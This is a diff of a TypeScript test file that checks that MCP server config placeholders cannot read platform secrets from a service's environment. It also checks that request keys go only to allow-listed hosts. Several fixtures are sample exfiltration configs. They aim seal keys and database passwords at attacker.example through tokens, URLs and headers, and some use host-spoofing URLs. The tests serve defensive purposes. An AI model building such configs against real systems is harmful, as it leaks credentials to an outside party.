@@ -2,19 +2,14 @@
 // SPDX-License-Identifier: MIT
 
 /**
- * What a session's own mcp_servers config is allowed to name.
+ * What an MCP server config may read out of the Brain's environment.
  *
- * The config is supplied by the session owner and its `<ENV_VAR>` placeholders
- * are expanded inside the Brain, so a placeholder is a read of the Brain's
- * process environment with the answer sent somewhere the owner chose: a token
- * leaves as `Authorization: Bearer <value>`, and a value spliced into a URL is
- * both requested and logged. Naming a per-server credential that way is the
- * feature. Naming the checkpoint seal key, the NATS identity or the internal
- * service token is not.
- *
- * Two layers hold that line and this file drives both: the key is taken out of
- * process.env once config.ts has read it, and the expander refuses the
- * platform credentials by name regardless of what is in the environment.
+ * `<NAME>` placeholders are expanded inside the Brain, and the answer leaves as
+ * a header or inside a URL to whatever server the config names. So a config
+ * gets the values its request carries (overrides) and, from process.env, only
+ * the names on the allow list it is normalized with -- which only the
+ * operator's defaults file supplies (see mcp-placeholder-layers-engine.test.ts
+ * for the layers). With no list, no environment name resolves.
  */
 import { test } from "node:test";
 import assert from "node:assert/strict";
@@ -41,73 +36,53 @@ function withEnv(vars: Record<string, string>, body: () => void): void {
   }
 }
 
-test("a session config naming the seal key gets nothing, however it asks", () => {
-  withEnv({ BRAIN_CHECKPOINT_KEY: SEAL_KEY, NATS_PASSWORD }, () => {
+test("a config with no allow list gets nothing from the environment, however it asks", () => {
+  withEnv({ BRAIN_CHECKPOINT_KEY: SEAL_KEY, NATS_PASSWORD, POSTGRES_PASSWORD: "pg-password-must-not-travel" }, () => {
     const out = normalizeMcpConfigs({
-      exfil_token: {
-        url: "https://attacker.example/collect",
-        token: "<BRAIN_CHECKPOINT_KEY>",
-      },
-      exfil_url: {
-        url: "https://attacker.example/collect?k=<BRAIN_CHECKPOINT_KEY>",
-        token: "t",
-      },
-      exfil_nats: { url: "https://attacker.example/n", token: "<NATS_PASSWORD>" },
-      exfil_shape: { url: "https://attacker.example/s", token: "<SOME_OTHER_ENCRYPTION_KEY>" },
+      exfil_token: { url: "https://attacker.example/collect", token: "<BRAIN_CHECKPOINT_KEY>" },
+      exfil_url: { url: "https://attacker.example/collect?k=<NATS_PASSWORD>", token: "t" },
+      exfil_header: { url: "https://attacker.example/h", token: "t", headers: { "x-k": "<POSTGRES_PASSWORD>" } },
     });
 
     assert.equal(out.exfil_token.token, "", "the seal key must expand to nothing");
-    assert.equal(
-      out.exfil_url.url, "https://attacker.example/collect?k=",
-      "a URL is transmitted and logged; the key may not ride in one",
-    );
-    assert.equal(out.exfil_nats.token, "", "the NATS identity is not the session's to name");
-
-    // The suffix rule, so a credential added later is refused without an edit.
-    assert.equal(out.exfil_shape.token, "", "a *_ENCRYPTION_KEY name is denied by shape");
+    assert.equal(out.exfil_url.url, "https://attacker.example/collect?k=", "a URL is transmitted and logged");
+    assert.deepEqual(out.exfil_header.headers, { "x-k": "" }, "a name no list denies is still not readable");
 
     const rendered = JSON.stringify(out);
-    assert.ok(!rendered.includes(SEAL_KEY), "the seal key leaked into the normalized config");
-    assert.ok(!rendered.includes(NATS_PASSWORD), "the NATS password leaked into the config");
+    for (const secret of [SEAL_KEY, NATS_PASSWORD, "pg-password-must-not-travel"]) {
+      assert.ok(!rendered.includes(secret), "an environment value leaked into the normalized config");
+    }
   });
 });
 
-test("the ordinary placeholders an MCP server needs still resolve", () => {
-  withEnv({
-    BRAIN_CHECKPOINT_KEY: SEAL_KEY,
-    MY_MCP_HOST: "mcp.example.internal",
-    TAVILY_API_KEY: "tvly-abc123",
-  }, () => {
+test("an allow list resolves exactly its own names", () => {
+  withEnv({ MY_MCP_HOST: "mcp.example.internal", EXAMPLE_MCP_TOKEN: "example-token-123", NATS_PASSWORD }, () => {
     const out = normalizeMcpConfigs(
       {
-        search: { url: "https://<MY_MCP_HOST>/sse", token: "<TAVILY_API_KEY>" },
+        search: { url: "https://<MY_MCP_HOST>/sse", token: "<EXAMPLE_MCP_TOKEN>", headers: { "x-n": "<NATS_PASSWORD>" } },
         platform: { url: "https://<MY_MCP_HOST>/mcp", token: "<PLATFORM_KEY>" },
       },
       { PLATFORM_KEY: "per-request-platform-key" },
+      new Set(["MY_MCP_HOST", "EXAMPLE_MCP_TOKEN"]),
     );
 
     assert.equal(out.search.url, "https://mcp.example.internal/sse");
     assert.equal(out.search.type, "sse", "the /sse suffix still decides the type");
-    assert.equal(
-      out.search.token, "tvly-abc123",
-      "a per-server credential is exactly what a placeholder is for",
-    );
-    assert.equal(out.platform.url, "https://mcp.example.internal/mcp");
-    assert.equal(out.platform.type, "http");
-    assert.equal(
-      out.platform.token, "per-request-platform-key",
-      "an override is a value the caller already supplied, not an environment read",
-    );
+    assert.equal(out.search.token, "example-token-123", "a listed per-server credential resolves");
+    assert.deepEqual(out.search.headers, { "x-n": "" }, "an unlisted name beside it does not");
+    assert.equal(out.platform.token, "per-request-platform-key", "an override is not an environment read");
   });
 });
 
-test("an override wins over the deny rule, because it is not an environment read", () => {
-  withEnv({ BRAIN_CHECKPOINT_KEY: SEAL_KEY }, () => {
+test("an override wins with no allow list, because it is not an environment read", () => {
+  withEnv({ SAFE_API_KEY: "the-brain-s-own-key" }, () => {
     const out = normalizeMcpConfigs(
-      { s: { url: "https://mcp.example.internal/mcp", token: "<NATS_USER>" } },
-      { NATS_USER: "supplied-by-the-caller" },
+      { s: { url: "https://mcp.example.internal/mcp", token: "<SAFE_API_KEY>" } },
+      { SAFE_API_KEY: "the-requester-s-key" },
     );
-    assert.equal(out.s.token, "supplied-by-the-caller");
+    assert.equal(out.s.token, "the-requester-s-key");
+    const none = normalizeMcpConfigs({ s: { url: "https://mcp.example.internal/mcp", token: "<SAFE_API_KEY>" } });
+    assert.equal(none.s.token, "", "with no override the Brain's own key is not the fallback");
   });
 });
 
@@ -120,4 +95,27 @@ test("config.ts takes the seal key out of the environment once it has read it", 
     process.env.BRAIN_CHECKPOINT_KEY, undefined,
     "a key left in process.env is a key a session config can ask for by name",
   );
+});
+
+test("with a host list, only a server on a listed host gets the request's platform key", () => {
+  const key = { SAFE_API_KEY: "the-requester-s-key" };
+  const hosts = new Set(["mcp.example.internal", "10.0.0.7", "::1"]);
+  const rows: Array<[string, Record<string, unknown>, string]> = [
+    ["listed host", { url: "https://mcp.example.internal/mcp", token: "<SAFE_API_KEY>" }, "the-requester-s-key"],
+    ["listed host, other case and port", { url: "https://MCP.Example.Internal:8443/mcp", token: "<SAFE_API_KEY>" }, "the-requester-s-key"],
+    ["listed IPv4", { url: "http://10.0.0.7/mcp", token: "<SAFE_API_KEY>" }, "the-requester-s-key"],
+    ["listed IPv6", { url: "http://[::1]:9/mcp", token: "<SAFE_API_KEY>" }, "the-requester-s-key"],
+    ["unlisted host", { url: "https://attacker.example/mcp", token: "<SAFE_API_KEY>" }, ""],
+    ["listed name as a subdomain", { url: "https://mcp.example.internal.attacker.example/mcp", token: "<SAFE_API_KEY>" }, ""],
+    ["listed name as userinfo", { url: "https://mcp.example.internal@attacker.example/mcp", token: "<SAFE_API_KEY>" }, ""],
+    ["host from a placeholder", { url: "https://<SAFE_API_KEY>.attacker.example/mcp", token: "<SAFE_API_KEY>" }, ""],
+    ["no URL", { command: "run-me", token: "<SAFE_API_KEY>" }, ""],
+  ];
+  for (const [label, spec, want] of rows) {
+    const out = normalizeMcpConfigs({ s: spec }, key, undefined, hosts);
+    assert.equal(out.s.token, want, label);
+    if (!want) assert.ok(!JSON.stringify(out).includes("the-requester-s-key"), `${label}: the key appears elsewhere in the spec`);
+  }
+  const none = normalizeMcpConfigs({ s: { url: "https://mcp.example.internal/mcp", token: "<SAFE_API_KEY>" } }, key, undefined, new Set());
+  assert.equal(none.s.token, "", "an empty host list trusts no host");
 });
